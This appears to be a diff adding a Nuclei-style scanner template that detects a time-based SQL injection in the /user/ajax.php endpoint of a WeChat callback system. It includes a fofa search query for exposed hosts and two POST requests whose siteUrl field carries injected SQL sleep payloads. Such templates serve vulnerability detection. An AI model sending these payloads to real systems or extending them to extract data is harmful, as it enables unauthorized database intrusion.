@@ -1,0 +1,42 @@
+id: wxgongzhonghuidiao-user_ajax-sql
+
+info:
+  name: "微信公众平台无限回调系统 ajax.php 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="mb-5 web-font-desc"
+      微信公众平台无限回调系统 /user/ajax.php 接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句实现数据库敏感信息泄露（包括但不限于管理员密码、用户隐私数据），在特定权限条件下可能通过写入Webshell获取服务器控制权。该漏洞无需身份验证即可触发，存在较高的远程利用风险。
+  reference:
+  - https://Unknown.blog.csdn.net/article/details/140629477
+  tags: 微信公众平台无限回调系统
+
+
+
+http:
+- raw:
+  - |
+    POST /user/ajax.php?act=siteadd HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    siteUrl=';select sleep(4)#'
+
+  - |
+    POST /user/ajax.php?act=siteadd HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    siteUrl=';select sleep(8)#'
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
